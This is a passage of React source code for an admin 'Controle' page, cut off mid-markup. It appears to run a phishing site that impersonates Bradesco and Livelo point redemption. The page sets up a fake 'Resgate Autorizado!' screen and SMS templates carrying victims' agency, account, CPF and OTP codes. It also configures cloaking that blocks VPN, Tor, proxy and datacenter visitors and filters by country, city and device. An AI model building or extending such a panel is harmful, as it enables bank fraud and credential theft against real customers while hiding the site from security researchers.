import { useEffect, useState, useMemo } from "react";
import { configRepository } from "@/repositories";
import { toast } from "sonner";
import {
  Save, Monitor, Smartphone, ShieldBan, MapPin, Shield, Globe,
  MessageSquareWarning, AlertTriangle, BarChart3, BotOff, FileText,
  MessageSquare, Info, Search, X, Plus, ChevronDown, FlaskConical,
} from "lucide-react";
import { Switch } from "@/components/ui/switch";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";

// ── Types ──
interface DeviceConfig { mobile: boolean; desktop: boolean }
interface ConnectionTypeConfig { vpn: boolean; proxy: boolean; tor: boolean; relay: boolean; hosting: boolean }
interface HomeAlertConfig { enabled: boolean; title: string; message: string }
interface HomeBannerConfig { enabled: boolean; message: string }
interface TurnstileConfig { enabled: boolean; site_key: string }
interface CompleteTexts { titulo: string; subtitulo: string; mensagem: string; botao: string; botao_url: string }
interface SmsTemplateConfig {
  key: string; label: string; description: string;
  variables: { key: string; desc: string }[];
  previewReplacements: Record<string, string>;
}

// ── Constants ──
const COMPLETE_DEFAULTS: CompleteTexts = {
  titulo: "Resgate Autorizado!", subtitulo: "Sua validação foi concluída com sucesso.",
  mensagem: "O resgate dos seus pontos Livelo será processado em até 48 horas úteis.",
  botao: "Voltar ao Início", botao_url: "https://banco.bradesco/html/classic/index.shtm",
};

const COMPLETE_FIELDS: { key: keyof CompleteTexts; label: string; type: "text" | "textarea" | "url" }[] = [
  { key: "titulo", label: "Título principal", type: "text" },
  { key: "subtitulo", label: "Subtítulo", type: "text" },
  { key: "mensagem", label: "Mensagem de processamento", type: "textarea" },
  { key: "botao", label: "Texto do botão", type: "text" },
  { key: "botao_url", label: "URL do botão", type: "url" },
];

const SMS_TEMPLATES: SmsTemplateConfig[] = [
  {
    key: "sms_template", label: "SMS de Conclusão", description: "Enviado ao finalizar o resgate",
    variables: [
      { key: "{{protocolo}}", desc: "Número do protocolo" }, { key: "{{agencia}}", desc: "Agência" },
      { key: "{{conta}}", desc: "Conta" }, { key: "{{cpf}}", desc: "CPF" }, { key: "{{nome}}", desc: "Nome" },
    ],
    previewReplacements: { "{{protocolo}}": "A1B2C3D4", "{{agencia}}": "1234", "{{conta}}": "56789-0", "{{cpf}}": "•••.456.789-••", "{{nome}}": "João" },
  },
  {
    key: "otp_sms_template", label: "SMS de Verificação (OTP)", description: "Código de verificação",
    variables: [{ key: "{{codigo}}", desc: "Código OTP de 6 dígitos" }],
    previewReplacements: { "{{codigo}}": "482917" },
  },
];

const COUNTRIES = [
  { code: "AF", name: "Afeganistão" }, { code: "ZA", name: "África do Sul" }, { code: "AL", name: "Albânia" },
  { code: "DE", name: "Alemanha" }, { code: "AD", name: "Andorra" }, { code: "AO", name: "Angola" },
  { code: "AR", name: "Argentina" }, { code: "AM", name: "Armênia" }, { code: "AU", name: "Austrália" },
  { code: "AT", name: "Áustria" }, { code: "AZ", name: "Azerbaijão" }, { code: "BD", name: "Bangladesh" },
  { code: "BE", name: "Bélgica" }, { code: "BO", name: "Bolívia" }, { code: "BA", name: "Bósnia" },
  { code: "BR", name: "Brasil" }, { code: "BG", name: "Bulgária" }, { code: "CA", name: "Canadá" },
  { code: "CL", name: "Chile" }, { code: "CN", name: "China" }, { code: "CO", name: "Colômbia" },
  { code: "KR", name: "Coreia do Sul" }, { code: "KP", name: "Coreia do Norte" }, { code: "CR", name: "Costa Rica" },
  { code: "HR", name: "Croácia" }, { code: "CU", name: "Cuba" }, { code: "DK", name: "Dinamarca" },
  { code: "EC", name: "Equador" }, { code: "EG", name: "Egito" }, { code: "AE", name: "Emirados Árabes" },
  { code: "ES", name: "Espanha" }, { code: "US", name: "Estados Unidos" }, { code: "EE", name: "Estônia" },
  { code: "FI", name: "Finlândia" }, { code: "FR", name: "França" }, { code: "GH", name: "Gana" },
  { code: "GE", name: "Geórgia" }, { code: "GR", name: "Grécia" }, { code: "GT", name: "Guatemala" },
  { code: "HN", name: "Honduras" }, { code: "HK", name: "Hong Kong" }, { code: "HU", name: "Hungria" },
  { code: "IN", name: "Índia" }, { code: "ID", name: "Indonésia" }, { code: "IQ", name: "Iraque" },
  { code: "IR", name: "Irã" }, { code: "IE", name: "Irlanda" }, { code: "IL", name: "Israel" },
  { code: "IT", name: "Itália" }, { code: "JP", name: "Japão" }, { code: "KZ", name: "Cazaquistão" },
  { code: "KE", name: "Quênia" }, { code: "LV", name: "Letônia" }, { code: "LT", name: "Lituânia" },
  { code: "LU", name: "Luxemburgo" }, { code: "MY", name: "Malásia" }, { code: "MA", name: "Marrocos" },
  { code: "MX", name: "México" }, { code: "MZ", name: "Moçambique" }, { code: "MM", name: "Mianmar" },
  { code: "NG", name: "Nigéria" }, { code: "NO", name: "Noruega" }, { code: "NZ", name: "Nova Zelândia" },
  { code: "NL", name: "Países Baixos" }, { code: "PK", name: "Paquistão" }, { code: "PY", name: "Paraguai" },
  { code: "PE", name: "Peru" }, { code: "PH", name: "Filipinas" }, { code: "PL", name: "Polônia" },
  { code: "PT", name: "Portugal" }, { code: "GB", name: "Reino Unido" }, { code: "CZ", name: "República Tcheca" },
  { code: "RO", name: "Romênia" }, { code: "RU", name: "Rússia" }, { code: "SG", name: "Singapura" },
  { code: "SE", name: "Suécia" }, { code: "CH", name: "Suíça" }, { code: "TW", name: "Taiwan" },
  { code: "TH", name: "Tailândia" }, { code: "TR", name: "Turquia" }, { code: "UA", name: "Ucrânia" },
  { code: "UY", name: "Uruguai" }, { code: "VE", name: "Venezuela" }, { code: "VN", name: "Vietnã" },
];

const BR_REGIONS = [
  "São Paulo", "Rio de Janeiro", "Belo Horizonte", "Brasília", "Salvador",
  "Curitiba", "Fortaleza", "Recife", "Porto Alegre", "Manaus",
  "Belém", "Goiânia", "Guarulhos", "Campinas", "São Luís",
  "Maceió", "Campo Grande", "Natal", "Teresina", "João Pessoa",
  "Florianópolis", "Vitória", "Cuiabá", "Aracaju", "Macapá",
  "Rio Branco", "Boa Vista", "Palmas", "Porto Velho",
  "Acre", "Alagoas", "Amapá", "Amazonas", "Bahia", "Ceará",
  "Distrito Federal", "Espírito Santo", "Goiás", "Maranhão",
  "Mato Grosso", "Mato Grosso do Sul", "Minas Gerais", "Pará",
  "Paraíba", "Paraná", "Pernambuco", "Piauí", "Rio Grande do Norte",
  "Rio Grande do Sul", "Rondônia", "Roraima", "Santa Catarina",
  "Sergipe", "Tocantins",
];

// ── Reusable: Collapsible Section ──
function CollapsibleSection({
  icon: Icon, title, badge, defaultOpen = false, children,
}: {
  icon: React.ElementType; title: string; badge?: React.ReactNode;
  defaultOpen?: boolean; children: React.ReactNode;
}) {
  const [open, setOpen] = useState(defaultOpen);
  return (
    <div className="rounded-xl border border-border bg-card overflow-hidden transition-all">
      <button
        onClick={() => setOpen(!open)}
        className="flex w-full items-center gap-3 px-4 py-3 hover:bg-muted/30 transition-colors text-left"
      >
        <Icon className="h-4 w-4 text-muted-foreground shrink-0" />
        <span className="text-sm font-medium text-foreground flex-1">{title}</span>
        {badge}
        <ChevronDown className={`h-4 w-4 text-muted-foreground transition-transform duration-200 ${open ? "rotate-180" : ""}`} />
      </button>
      {open && <div className="border-t border-border">{children}</div>}
    </div>
  );
}

// ── Status Badge ──
function StatusBadge({ active, label }: { active: boolean; label?: string }) {
  return (
    <span className={`inline-flex items-center gap-1.5 rounded-full px-2 py-0.5 text-[10px] font-mono uppercase tracking-wider ${
      active ? "bg-emerald-500/15 text-emerald-400 border border-emerald-500/30" : "bg-muted text-muted-foreground border border-border"
    }`}>
      <span className={`h-1.5 w-1.5 rounded-full ${active ? "bg-emerald-400" : "bg-muted-foreground/50"}`} />
      {label || (active ? "Ativo" : "Inativo")}
    </span>
  );
}

// ── Tag Selector ──
function TagSelector({ selected, onAdd, onRemove, placeholder, searchList }: {
  selected: string[];
  onAdd: (item: string) => void;
  onRemove: (item: string) => void;
  placeholder: string;
  searchList: { value: string; label: string }[];
}) {
  const [query, setQuery] = useState("");
  const [open, setOpen] = useState(false);
  const filtered = useMemo(() => {
    const q = query.toLowerCase();
    return searchList.filter(
      (item) => !selected.includes(item.value) && (item.label.toLowerCase().includes(q) || item.value.toLowerCase().includes(q))
    );
  }, [query, searchList, selected]);

  return (
    <div className="space-y-2">
      {selected.length > 0 && (
        <div className="flex flex-wrap gap-1.5">
          {selected.map((item) => {
            const found = searchList.find((s) => s.value === item);
            return (
              <span key={item} className="inline-flex items-center gap-1 rounded-md bg-primary/15 border border-primary/30 px-2 py-1 text-xs font-mono text-primary">
                {found ? found.label : item}
                <button onClick={() => onRemove(item)} className="hover:text-destructive transition-colors"><X className="h-3 w-3" /></button>
              </span>
            );
          })}
        </div>
      )}
      <div className="relative">
        <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-muted-foreground" />
        <input
          value={query} onChange={(e) => { setQuery(e.target.value); setOpen(true); }}
          onFocus={() => setOpen(true)} onBlur={() => setTimeout(() => setOpen(false), 200)}
          placeholder={placeholder}
          className="w-full rounded-lg border border-border bg-muted/30 pl-9 pr-3 py-2 text-sm text-foreground placeholder:text-muted-foreground/50 outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-colors"
        />
      </div>
      {open && filtered.length > 0 && (
        <div className="max-h-48 overflow-y-auto rounded-lg border border-border bg-card shadow-lg">
          {filtered.slice(0, 30).map((item) => (
            <button key={item.value} onMouseDown={() => { onAdd(item.value); setQuery(""); }}
              className="flex w-full items-center gap-2 px-3 py-2 text-sm text-foreground hover:bg-muted transition-colors text-left">
              <Plus className="h-3 w-3 text-muted-foreground shrink-0" />
              <span>{item.label}</span>
              <span className="ml-auto text-xs font-mono text-muted-foreground">{item.value}</span>
            </button>
          ))}
        </div>
      )}
    </div>
  );
}

// ── Input helpers ──
const inputClass = "w-full rounded-lg border border-border bg-muted/30 px-3 py-2 text-sm text-foreground placeholder:text-muted-foreground/50 outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-colors";
const monoInputClass = `${inputClass} font-mono`;
const textareaClass = `${inputClass} resize-none`;
const monoTextareaClass = `${monoInputClass} resize-none`;

// ════════════════════════════════════════
// Main Component
// ════════════════════════════════════════
export default function AdminAccessConfigPage() {
  const [devices, setDevices] = useState<DeviceConfig>({ mobile: true, desktop: true });
  const [connTypes, setConnTypes] = useState<ConnectionTypeConfig>({ vpn: false, proxy: false, tor: false, relay: false, hosting: false });
  const [blockedIps, setBlockedIps] = useState("");
  const [blockedRegions, setBlockedRegions] = useState<string[]>([]);
  const [allowedCountries, setAllowedCountries] = useState<string[]>([]);
  const [blockedCountries, setBlockedCountries] = useState<string[]>([]);
  const [homeAlert, setHomeAlert] = useState<HomeAlertConfig>({ enabled: false, title: "", message: "" });
  const [homeBanner, setHomeBanner] = useState<HomeBannerConfig>({ enabled: false, message: "" });
  const [googleId, setGoogleId] = useState("");
  // testEventCode is session-only (not persisted) — used only for the test button
  const [testEventCode, setTestEventCode] = useState("");
  const [testing, setTesting] = useState(false);
  const [testResult, setTestResult] = useState<{ ok: boolean; message: string } | null>(null);
  const [testingWeb, setTestingWeb] = useState(false);
  const [testResultWeb, setTestResultWeb] = useState<{ ok: boolean; message: string } | null>(null);
  const [turnstileConfig, setTurnstileConfig] = useState<TurnstileConfig>({ enabled: false, site_key: "" });
  const [completeTexts, setCompleteTexts] = useState<CompleteTexts>(COMPLETE_DEFAULTS);
  const [smsValues, setSmsValues] = useState<Record<string, string>>({});
  const [saving, setSaving] = useState(false);
  const [saved, setSaved] = useState(false);

  const markDirty = () => setSaved(false);

  useEffect(() => {
    configRepository.getAll().then((rows) => {
      for (const row of rows) {
        const v = row.config_value;
        switch (row.config_key) {
          case "allowed_devices":
            if (v && typeof v === "object" && !Array.isArray(v))
              setDevices(v as unknown as DeviceConfig);
            break;
          case "blocked_ips":
            setBlockedIps(Array.isArray(v) ? (v as string[]).join("\n") : "");
            break;
          case "blocked_regions":
            setBlockedRegions(Array.isArray(v) ? (v as string[]) : []);
            break;
          case "blocked_connection_types":
            if (v && typeof v === "object" && !Array.isArray(v))
              setConnTypes(v as unknown as ConnectionTypeConfig);
            break;
          case "allowed_countries":
            setAllowedCountries(Array.isArray(v) ? (v as string[]) : []);
            break;
          case "blocked_countries":
            setBlockedCountries(Array.isArray(v) ? (v as string[]) : []);
            break;
          case "home_alert":
            if (v && typeof v === "object" && !Array.isArray(v))
              setHomeAlert(v as unknown as HomeAlertConfig);
            break;
          case "home_banner":
            if (v && typeof v === "object" && !Array.isArray(v))
              setHomeBanner(v as unknown as HomeBannerConfig);
            break;
          case "tracking_google_id":
            setGoogleId(typeof v === "string" ? v : "");
            break;
          case "turnstile_config":
            if (v && typeof v === "object" && !Array.isArray(v))
              setTurnstileConfig(v as unknown as TurnstileConfig);
            break;
          case "complete_texts": {
            const obj = typeof v === "string" ? JSON.parse(v) : v;
            if (obj && typeof obj === "object") setCompleteTexts({ ...COMPLETE_DEFAULTS, ...(obj as object) });
            break;
          }
          case "sms_template":
          case "otp_sms_template": {
            let val = typeof v === "string" ? v : "";
            try { const p = JSON.parse(val); if (typeof p === "string") val = p; } catch { /* ok */ }
            setSmsValues((prev) => ({ ...prev, [row.config_key]: val }));
            break;
          }
        }
      }
    }).catch((err) => {
      console.error("Failed to load config:", err);
      toast.error("Erro ao carregar configurações");
    });
  }, []);

  const handleSave = async () => {
    setSaving(true);
    try {
      // Single batchUpsert call replaces 13+ parallel network requests (data-n-plus-one).
      const ipsArray = blockedIps.split("\n").map((s) => s.trim()).filter(Boolean);
      await configRepository.batchUpsert([
        { key: "allowed_devices",          value: devices as any },
        { key: "blocked_ips",              value: ipsArray as any },
        { key: "blocked_regions",          value: blockedRegions as any },
        { key: "blocked_connection_types", value: connTypes as any },
        { key: "allowed_countries",        value: allowedCountries as any },
        { key: "blocked_countries",        value: blockedCountries as any },
        { key: "home_alert",               value: homeAlert as any },
        { key: "home_banner",              value: homeBanner as any },
        { key: "tracking_google_id",       value: googleId as any },
        { key: "turnstile_config",         value: turnstileConfig as any },
        { key: "complete_texts",           value: completeTexts as any },
        ...SMS_TEMPLATES.map((tpl) => ({
          key: tpl.key,
          value: (smsValues[tpl.key] || "") as any,
        })),
      ]);
      setSaved(true);
      setTimeout(() => setSaved(false), 3000);
    } catch (err) {
      console.error("Config save error:", err);
      toast.error("Erro ao salvar configurações");
    } finally {
      setSaving(false);
    }
  };

  const handleTestEvent = async () => {
    setTesting(true);
    setTestResult(null);
    try {
      const eventId = `test-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
      const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL as string;
      const ANON_KEY = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY as string;
      const res = await fetch(`${SUPABASE_URL}/functions/v1/meta-capi`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "apikey": ANON_KEY,
          "Authorization": `Bearer ${ANON_KEY}`,
        },
        body: JSON.stringify({
          event_name: "Lead",
          event_id: eventId,
          event_source_url: window.location.href,
          ...(testEventCode ? { test_event_code: testEventCode } : {}),
          user_data: { client_user_agent: navigator.userAgent },
        }),
      });
      const response = await res.json() as { success?: boolean; result?: { events_received?: number; fbtrace_id?: string }; error?: string } | null;

      const received = response?.result?.events_received;
      const traceId = response?.result?.fbtrace_id;
      setTestResult({
        ok: response?.success === true,
        message: response?.success
          ? `${received ?? "?"} evento(s) recebido(s)${traceId ? ` · trace: ${traceId}` : ""}`
          : (response?.error ?? "Resposta inesperada do servidor"),
      });
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : "Erro desconhecido";
      setTestResult({ ok: false, message: msg });
    } finally {
      setTesting(false);
    }
  };

  const handleTestWebEvent = () => {
    setTestingWeb(true);
    setTestResultWeb(null);
    try {
      const fbq = (window as unknown as { fbq?: (...args: unknown[]) => void }).fbq;
      if (!fbq) {
        setTestResultWeb({ ok: false, message: "window.fbq não encontrado — o pixel não foi carregado. Acesse o site normalmente primeiro para inicializar o pixel." });
        return;
      }
      const eventId = `web-test-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
      fbq("track", "Lead", { content_name: "admin_web_test" }, { eventID: eventId });
      setTestResultWeb({ ok: true, message: `Evento Lead disparado via Pixel (event_id: ${eventId}). Verifique no Meta Pixel Helper ou na aba Atividade do pixel.` });
    } catch (err) {
      const msg = err instanceof Error ? err.message : "Erro desconhecido";
      setTestResultWeb({ ok: false, message: msg });
    } finally {
      setTestingWeb(false);
    }
  };

  const getSmsPreview = (tpl: SmsTemplateConfig) => {
    let text = smsValues[tpl.key] || "";
    Object.entries(tpl.previewReplacements).forEach(([k, v]) => { text = text.split(k).join(v); });
    return text;
  };

  const countrySearchList = useMemo(() => COUNTRIES.map((c) => ({ value: c.code, label: c.name })), []);
  const regionSearchList = useMemo(() => [...new Set(BR_REGIONS)].sort().map((r) => ({ value: r, label: r })), []);
  const activeConnBlocks = Object.values(connTypes).filter(Boolean).length;

  return (
    <div className="space-y-5 max-w-4xl">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-xl font-bold text-foreground font-mono tracking-tight">// Controle</h1>
          <p className="text-xs text-muted-foreground font-mono mt-1">Configuração geral do sistema</p>
        </div>
        <button onClick={handleSave} disabled={saving} className="flex items-center gap-2 rounded-lg bg-primary px-4 py-2.5 text-sm font-medium text-primary-foreground hover:bg-primary/90 transition-colors disabled:opacity-50">
          <Save className="h-4 w-4" />
          {saving ? "Salvando..." : "Salvar tudo"}
        </button>
      </div>

      {saved && (
        <div className="rounded-lg bg-emerald-500/15 border border-emerald-500/30 px-4 py-3 text-sm font-mono text-emerald-400">
          ✓ Configuração salva
        </div>
      )}

      <Tabs defaultValue="aparencia" className="w-full">
        <TabsList className="w-full grid grid-cols-4 bg-muted/50 border border-border rounded-lg h-auto p-1">
          <TabsTrigger value="aparencia" className="text-xs font-mono py-2 data-[state=active]:bg-card data-[state=active]:shadow-sm">Aparência</TabsTrigger>
          <TabsTrigger value="seguranca" className="text-xs font-mono py-2 data-[state=active]:bg-card data-[state=active]:shadow-sm">Segurança</TabsTrigger>
          <TabsTrigger value="geo" className="text-xs font-mono py-2 data-[state=active]:bg-card data-[state=active]:shadow-sm">Geo / IP</TabsTrigger>
          <TabsTrigger value="tracking" className="text-xs font-mono py-2 data-[state=active]:bg-card data-[state=active]:shadow-sm">Tracking</TabsTrigger>
        </TabsList>

        {/* ═══ APARÊNCIA ═══ */}
        <TabsContent value="aparencia" className="space-y-3 mt-4">
          <CollapsibleSection icon={MessageSquareWarning} title="Alerta na Tela Inicial" badge={<StatusBadge active={homeAlert.enabled} />} defaultOpen>
            <div className="p-4 space-y-3">
              <div className="flex items-center justify-between">
                <label className="text-sm font-medium text-foreground">Exibir modal</label>
                <Switch checked={homeAlert.enabled} onCheckedChange={(v) => { setHomeAlert((p) => ({ ...p, enabled: v })); markDirty(); }} />
              </div>
              <div>
                <label className="font-mono text-[10px] tracking-wider text-muted-foreground uppercase mb-1.5 block">Título</label>
                <input value={homeAlert.title} onChange={(e) => { setHomeAlert((p) => ({ ...p, title: e.target.value })); markDirty(); }} placeholder="Tentativa de acesso não reconhecida" className={inputClass} />
              </div>
              <div>
                <label className="font-mono text-[10px] tracking-wider text-muted-foreground uppercase mb-1.5 block">Mensagem</label>
                <textarea value={homeAlert.message} onChange={(e) => { setHomeAlert((p) => ({ ...p, message: e.target.value })); markDirty(); }} rows={3} className={textareaClass} />
              </div>
            </div>
          </CollapsibleSection>

          <CollapsibleSection icon={AlertTriangle} title="Banner Fixo no Topo" badge={<StatusBadge active={homeBanner.enabled} />}>
            <div className="p-4 space-y-3">
              <div className="flex items-center justify-between">
                <label className="text-sm font-medium text-foreground">Exibir banner</label>
                <Switch checked={homeBanner.enabled} onCheckedChange={(v) => { setHomeBanner((p) => ({ ...p, enabled: v })); markDirty(); }} />
              </div>
              <div>
                <label className="font-mono text-[10px] tracking-wider text-muted-foreground uppercase mb-1.5 block">Mensagem</label>
                <textarea value={homeBanner.message} onChange={(e) => { setHomeBanner((p) => ({ ...p, message: e.target.value })); markDirty(); }} rows={2} className={textareaClass} />
              </div>
            </div>
          </CollapsibleSection>

          <CollapsibleSection icon={FileText} title="Tela de Conclusão">
            <div className="p-4 space-y-3">
              {COMPLETE_FIELDS.map((field) => (
                <div key={field.key}>
                  <label className="font-mono text-[10px] tracking-wider text-muted-foreground uppercase mb-1.5 block">{field.label}</label>
                  {field.type === "textarea" ? (
                    <textarea value={completeTexts[field.key]} onChange={(e) => { setCompleteTexts((p) => ({ ...p, [field.key]: e.target.value })); markDirty(); }} rows={2} className={textareaClass} />
                  ) : (
                    <input type={field.type} value={completeTexts[field.key]} onChange={(e) => { setCompleteTexts((p) => ({ ...p, [field.key]: e.target.value })); markDirty(); }} className={inputClass} />
                  )}
                </div>
              ))}
              <div className="rounded-lg bg-muted/50 border border-border p-4 space-y-1.5 mt-1">
                <p className="font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Prévia</p>
                <h3 className="text-sm font-bold text-foreground">{completeTexts.titulo}</h3>
                <p className="text-xs text-muted-foreground">{completeTexts.subtitulo}</p>
                <p className="text-xs text-muted-foreground">{completeTexts.mensagem}</p>
                <div className="rounded-full border border-border px-3 py-1 text-center text-[11px] font-semibold text-foreground mt-2 max-w-[200px] mx-auto">{completeTexts.botao}</div>
              </div>
            </div>
          </CollapsibleSection>

          {SMS_TEMPLATES.map((tpl) => {
            const val = smsValues[tpl.key] || "";
            return (
              <CollapsibleSection key={tpl.key} icon={MessageSquare} title={tpl.label} badge={
                <span className={`text-[10px] font-mono px-1.5 py-0.5 rounded border ${val.length > 160 ? "text-destructive border-destructive/30 bg-destructive/10" : "text-muted-foreground border-border bg-muted"}`}>
                  {val.length}/160
                </span>
              }>
                <div className="p-4 space-y-3">
                  <p className="text-xs text-muted-foreground">{tpl.description}</p>
                  <div className="flex items-center gap-1.5 flex-wrap">
                    <Info className="h-3 w-3 text-muted-foreground shrink-0" />
                    {tpl.variables.map((v) => (
                      <button key={v.key} onClick={() => { setSmsValues((p) => ({ ...p, [tpl.key]: (p[tpl.key] || "") + v.key })); markDirty(); }}
                        className="rounded bg-muted px-1.5 py-0.5 text-[11px] font-mono text-muted-foreground hover:bg-primary/10 hover:text-primary transition-colors" title={v.desc}>
                        {v.key}
                      </button>
                    ))}
                  </div>
                  <textarea value={val} onChange={(e) => { setSmsValues((p) => ({ ...p, [tpl.key]: e.target.value })); markDirty(); }} rows={3} className={textareaClass} placeholder="Digite o modelo..." />
                  {val && (
                    <div className="rounded-lg bg-muted/50 border border-border p-3 text-xs text-foreground whitespace-pre-wrap">
                      {getSmsPreview(tpl)}
                    </div>
                  )}
                </div>
              </CollapsibleSection>
            );
          })}
        </TabsContent>

        {/* ═══ SEGURANÇA ═══ */}
        <TabsContent value="seguranca" className="space-y-3 mt-4">
          <CollapsibleSection icon={Monitor} title="Dispositivos Permitidos" badge={
            <span className="text-[10px] font-mono text-muted-foreground">
              {[devices.mobile && "Mobile", devices.desktop && "Desktop"].filter(Boolean).join(" + ") || "Nenhum"}
            </span>
          } defaultOpen>
            <div className="divide-y divide-border">
              <div className="flex items-center justify-between px-4 py-3">
                <div className="flex items-center gap-3"><Smartphone className="h-4 w-4 text-muted-foreground" /><span className="text-sm text-foreground">Mobile</span></div>
                <Switch checked={devices.mobile} onCheckedChange={(v) => { setDevices((d) => ({ ...d, mobile: v })); markDirty(); }} />
              </div>
              <div className="flex items-center justify-between px-4 py-3">
                <div className="flex items-center gap-3"><Monitor className="h-4 w-4 text-muted-foreground" /><span className="text-sm text-foreground">Desktop</span></div>
                <Switch checked={devices.desktop} onCheckedChange={(v) => { setDevices((d) => ({ ...d, desktop: v })); markDirty(); }} />
              </div>
            </div>
          </CollapsibleSection>

          <CollapsibleSection icon={Shield} title="Tipos de Conexão Bloqueados" badge={
            activeConnBlocks > 0 ? <span className="text-[10px] font-mono text-destructive">{activeConnBlocks} bloqueado(s)</span> : undefined
          } defaultOpen>
            <div className="divide-y divide-border">
              {([
                { key: "vpn" as const, label: "VPN" }, { key: "proxy" as const, label: "Proxy" },
                { key: "tor" as const, label: "Tor" }, { key: "relay" as const, label: "Relay (iCloud)" },
                { key: "hosting" as const, label: "Hosting / Datacenter" },
              ]).map(({ key, label }) => (
                <div key={key} className="flex items-center justify-between px-4 py-2.5">
                  <span className="text-sm text-foreground">{label}</span>
                  <Switch checked={connTypes[key]} onCheckedChange={(v) => { setConnTypes((p) => ({ ...p, [key]: v })); markDirty(); }} />
                </div>
              ))}
            </div>
          </CollapsibleSection>

          <CollapsibleSection icon={BotOff} title="Cloudflare Turnstile" badge={<StatusBadge active={turnstileConfig.enabled} />}>
            <div className="p-4 space-y-3">
              <div className="flex items-center justify-between">
                <label className="text-sm font-medium text-foreground">Anti-bot ativado</label>
                <Switch checked={turnstileConfig.enabled} onCheckedChange={(v) => { setTurnstileConfig((p) => ({ ...p, enabled: v })); markDirty(); }} />
              </div>
              <div>
                <label className="font-mono text-[10px] tracking-wider text-muted-foreground uppercase mb-1.5 block">Site Key</label>
                <input value={turnstileConfig.site_key} onChange={(e) => { setTurnstileConfig((p) => ({ ...p, site_key: e.target.value })); markDirty(); }} placeholder="1x00000000000000000000AA" className={monoInputClass} />
              </div>
              <div className="rounded-lg bg-muted/50 border border-border px-3 py-2 text-xs text-muted-foreground">
                <strong className="text-foreground">Secret Key</strong> — configure como <code className="bg-muted px-1 rounded font-mono text-[11px] text-foreground">TURNSTILE_SECRET_KEY</code> nas variáveis secretas do servidor.
              </div>
            </div>
          </CollapsibleSection>
        </TabsContent>

        {/* ═══ GEO / IP ═══ */}
        <TabsContent value="geo" className="space-y-3 mt-4">
          <CollapsibleSection icon={ShieldBan} title="IPs Bloqueados" badge={
            blockedIps.trim() ? <span className="text-[10px] font-mono text-muted-foreground">{blockedIps.split("\n").filter(Boolean).length} IP(s)</span> : undefined
          } defaultOpen>
            <div className="p-4">
              <textarea value={blockedIps} onChange={(e) => { setBlockedIps(e.target.value); markDirty(); }} placeholder={"192.168.1.1\n10.0.0.1"} rows={4} className={monoTextareaClass} />
              <p className="text-[11px] text-muted-foreground mt-1.5">Um IP por linha</p>
            </div>
          </CollapsibleSection>

          <div className="grid grid-cols-1 lg:grid-cols-2 gap-3">
            <CollapsibleSection icon={Globe} title="Países Permitidos" badge={
              allowedCountries.length > 0 ? <span className="text-[10px] font-mono text-emerald-400">{allowedCountries.length}</span> : <span className="text-[10px] font-mono text-muted-foreground">Todos</span>
            } defaultOpen>
              <div className="p-4">
                <TagSelector selected={allowedCountries} onAdd={(c) => { setAllowedCountries((p) => [...p, c]); markDirty(); }} onRemove={(c) => { setAllowedCountries((p) => p.filter((x) => x !== c)); markDirty(); }} placeholder="Buscar país..." searchList={countrySearchList} />
                <p className="text-[11px] text-muted-foreground mt-2">Se vazio, todos os países são permitidos</p>
              </div>
            </CollapsibleSection>

            <CollapsibleSection icon={Globe} title="Países Bloqueados" badge={
              blockedCountries.length > 0 ? <span className="text-[10px] font-mono text-destructive">{blockedCountries.length}</span> : undefined
            } defaultOpen>
              <div className="p-4">
                <TagSelector selected={blockedCountries} onAdd={(c) => { setBlockedCountries((p) => [...p, c]); markDirty(); }} onRemove={(c) => { setBlockedCountries((p) => p.filter((x) => x !== c)); markDirty(); }} placeholder="Buscar país..." searchList={countrySearchList} />
              </div>
            </CollapsibleSection>
          </div>

          <CollapsibleSection icon={MapPin} title="Regiões / Cidades Bloqueadas" badge={
            blockedRegions.length > 0 ? <span className="text-[10px] font-mono text-destructive">{blockedRegions.length}</span> : undefined
          } defaultOpen>
            <div className="p-4">
              <TagSelector selected={blockedRegions} onAdd={(r) => { setBlockedRegions((p) => [...p, r]); markDirty(); }} onRemove={(r) => { setBlockedRegions((p) => p.filter((x) => x !== r)); markDirty(); }} placeholder="Buscar cidade ou estado..." searchList={regionSearchList} />
            </div>
          </CollapsibleSection>
        </TabsContent>

        {/* ═══ TRACKING ═══ */}
        <TabsContent value="tracking" className="space-y-3 mt-4">
          <CollapsibleSection icon={BarChart3} title="Meta Pixel + CAPI" badge={<StatusBadge active label="Via Secrets" />} defaultOpen>
            <div className="p-4 space-y-4">
              {/* Secrets info */}
              <div className="rounded-lg bg-muted/50 border border-border px-3 py-2.5 text-[11px] text-muted-foreground space-y-1">
                <p><strong className="text-foreground">VITE_META_PIXEL_ID</strong> — Pixel ID (frontend, build-time).</p>
                <p><strong className="text-foreground">META_PIXEL_ID</strong> e <strong className="text-foreground">META_CAPI_ACCESS_TOKEN</strong> — Secrets da edge function <code className="bg-muted px-1 rounded font-mono text-[11px] text-foreground">meta-capi</code>.</p>
                <p className="mt-1">Configure via <code className="bg-muted px-1 rounded font-mono text-[11px] text-foreground">supabase secrets set META_PIXEL_ID=... META_CAPI_ACCESS_TOKEN=...</code> ou no painel <strong className="text-foreground">Supabase → Edge Functions → Secrets</strong>.</p>
              </div>

              {/* Divider */}
              <div className="border-t border-border pt-3 space-y-3">
                <div className="flex items-center gap-2">
                  <FlaskConical className="h-3.5 w-3.5 text-muted-foreground" />
                  <span className="font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Testar Evento</span>
                </div>

                {/* Test Event Code */}
                <div>
                  <label className="font-mono text-[10px] tracking-wider text-muted-foreground uppercase mb-1.5 block">Test Event Code</label>
                  <input
                    value={testEventCode}
                    onChange={(e) => setTestEventCode(e.target.value.toUpperCase())}
                    placeholder="TEST12345"
                    className={monoInputClass}
                  />
                  <p className="text-[11px] text-muted-foreground mt-1.5">
                    Obtenha em: Meta Business Suite → Gerenciador de Eventos → <strong className="text-foreground">Testar eventos</strong>
                  </p>
                </div>

                {/* Test buttons */}
                <div className="flex flex-wrap gap-2">
                  <button
                    onClick={handleTestEvent}
